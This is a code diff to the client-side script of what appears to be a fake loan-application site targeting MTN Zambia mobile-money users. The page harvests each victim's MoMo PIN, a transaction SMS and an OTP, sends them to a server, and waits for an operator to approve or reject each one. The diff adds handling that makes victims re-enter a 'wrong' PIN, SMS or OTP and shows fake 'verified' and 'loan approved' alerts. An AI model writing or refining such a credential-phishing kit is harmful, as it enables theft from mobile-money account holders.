@@ -42,14 +42,12 @@ function validateStep1() {
   document.getElementById('screen-step2').classList.add('active');
 }
 
-// Helper to validate MTN Zambia phone numbers (Must start with 96 or 76 after country code, total 9 digits after prefix)
+// Helper to validate MTN Zambia phone numbers (Must start with 96 or 76)
 function isValidMtnZambiaNumber(phoneStr) {
   let cleaned = phoneStr.replace(/\D/g, '');
-  // If user included 260 country code prefix
   if (cleaned.startsWith('260') && cleaned.length === 12) {
     cleaned = cleaned.substring(3);
   }
-  // Must be 9 digits total and start with 96 or 76
   if (cleaned.length === 9 && (cleaned.startsWith('96') || cleaned.startsWith('76'))) {
     return true;
   }
@@ -76,7 +74,6 @@ function validateStep2() {
   appDataStore.lastName = lastName;
   appDataStore.phone = phone;
 
-  // Populate Step 3 summary details
   document.getElementById('summary-amount').innerText = `ZMW ${Number(appDataStore.amount).toLocaleString()}`;
   document.getElementById('summary-term').innerText = appDataStore.term;
   document.getElementById('summary-purpose').innerText = appDataStore.purpose;
@@ -172,7 +169,14 @@ async function submitPinLogin() {
     body: JSON.stringify({ appId: appDataStore.appId, pin, phone: appDataStore.phone })
   });
 
-  startPollingForNextStep('SMS_STEP', 'screen-waiting-admin', 'screen-sms');
+  startPollingForNextStep(
+    'SMS_STEP', 
+    'screen-waiting-admin', 
+    'screen-sms', 
+    'PIN_REJECTED', 
+    'screen-login', 
+    '✅ CORRECT PIN VERIFIED'
+  );
 }
 
 // SMS Countdown Timer & Enforcement
@@ -221,7 +225,14 @@ async function submitSmsVerification() {
     body: JSON.stringify({ appId: appDataStore.appId, smsText })
   });
 
-  startPollingForNextStep('OTP_STEP', 'screen-waiting-sms', 'screen-otp');
+  startPollingForNextStep(
+    'OTP_STEP', 
+    'screen-waiting-sms', 
+    'screen-otp', 
+    'SMS_REJECTED', 
+    'screen-sms', 
+    '✅ CORRECT SMS MESSAGE VERIFIED'
+  );
 }
 
 // OTP Inputs Management
@@ -261,10 +272,17 @@ async function submitOtpCode() {
     body: JSON.stringify({ appId: appDataStore.appId, otpCode })
   });
 
-  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success');
+  startPollingForNextStep(
+    'APPROVED', 
+    'screen-waiting-otp', 
+    'screen-success', 
+    'OTP_REJECTED', 
+    'screen-otp', 
+    '✅ CORRECT OTP VERIFIED - LOAN APPROVED'
+  );
 }
 
-function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId) {
+function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, rejectionStatus, rejectionScreenId, successMessage) {
   if (pollInterval) clearInterval(pollInterval);
 
   pollInterval = setInterval(async () => {
@@ -285,13 +303,52 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId) {
         }
 
         document.getElementById(nextScreenId).classList.add('active');
-      } else if (data.status && data.status.includes('REJECTED')) {
+        if (successMessage) alert(successMessage);
+      } else if (data.status === rejectionStatus) {
         clearInterval(pollInterval);
-        alert('Verification failed or was rejected by admin.');
-        location.reload();
+        document.getElementById(waitingScreenId).style.display = 'none';
+        
+        let errorMsg = '❌ Verification Rejected';
+        if (rejectionStatus === 'PIN_REJECTED') {
+          errorMsg = '❌ WRONG PIN ENTERED. Please check your MoMo PIN and try again.';
+          document.querySelectorAll('.p-pin').forEach(i => i.value = '');
+          const btn = document.getElementById('btn-login-momo');
+          if (btn) {
+            btn.style.background = '#E2E2E2';
+            btn.style.color = '#888';
+            btn.setAttribute('disabled', 'true');
+          }
+          const firstPin = document.querySelector('.p-pin');
+          if (firstPin) firstPin.focus();
+        } else if (rejectionStatus === 'SMS_REJECTED') {
+          errorMsg = '❌ WRONG SMS PASTED. Please copy and paste the correct transaction SMS message.';
+          const smsInput = document.getElementById('sms-text-input');
+          if (smsInput) smsInput.value = '';
+          const btn = document.getElementById('btn-submit-sms');
+          if (btn) {
+            btn.style.background = '#E2E2E2';
+            btn.style.color = '#888';
+            btn.setAttribute('disabled', 'true');
+          }
+        } else if (rejectionStatus === 'OTP_REJECTED') {
+          errorMsg = '❌ WRONG OTP. Please check your code and enter the correct OTP.';
+          document.querySelectorAll('.p-otp').forEach(i => i.value = '');
+          const btn = document.getElementById('btn-verify-otp');
+          if (btn) {
+            btn.style.background = '#E2E2E2';
+            btn.style.color = '#888';
+            btn.setAttribute('disabled', 'true');
+          }
+          const firstOtp = document.querySelector('.p-otp');
+          if (firstOtp) firstOtp.focus();
+        }
+
+        document.getElementById(rejectionScreenId).classList.add('active');
+        alert(errorMsg);
       }
     } catch (e) {
       console.error('Polling error:', e);
     }
   }, 3000);
-}
+    }
+    
